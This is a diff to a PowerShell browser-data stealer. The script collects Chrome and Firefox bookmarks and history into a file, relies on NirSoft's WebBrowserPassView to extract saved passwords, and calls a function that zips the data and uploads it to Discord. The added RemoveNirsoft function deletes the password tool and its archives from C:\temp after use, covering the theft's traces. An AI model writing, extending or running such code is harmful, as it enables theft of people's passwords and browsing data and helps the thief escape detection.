@@ -104,6 +104,9 @@ function Exfiltration {
     GrabBrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath "Br0ws3r_d4t4.txt"
     GrabBrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "Br0ws3r_d4t4.txt"
 
+    #Call RemoveNirsoft
+    RemoveNirsoft
+
     #Call ZipAndUploadToDiscord
     ZipAndUploadToDiscord
 }
@@ -468,6 +471,35 @@ function DelTempDir {
         # Remove the C:\temp directory
         Remove-Item -Path "C:\temp" -Force -Recurse
     }
+
+function RemoveNirsoft {
+    $tempDirectory = "C:\temp"
+    
+    $filesToDelete = @(
+        "7z.zip",
+        "7z",
+        "readme.txt",
+        "wbpv.zip",
+        "WebBrowserPassView.cfg",
+        "WebBrowserPassView.chm",
+        "WebBrowserPassView.exe"
+    )
+
+    foreach ($file in $filesToDelete) {
+        $filePath = Join-Path -Path $tempDirectory -ChildPath $file
+
+        # Check if the file exists before attempting to remove it
+        if (Test-Path -Path $filePath -PathType Leaf) {
+            Remove-Item -Path $filePath -Force
+            Write-Host "Deleted file: $file"
+        } elseif (Test-Path -Path $filePath -PathType Container) {
+            Remove-Item -Path $filePath -Recurse -Force
+            Write-Host "Deleted directory: $file"
+        } else {
+            Write-Host "File not found: $file"
+        }
+    }
+}
 
 # Call TempDir
 TempDir
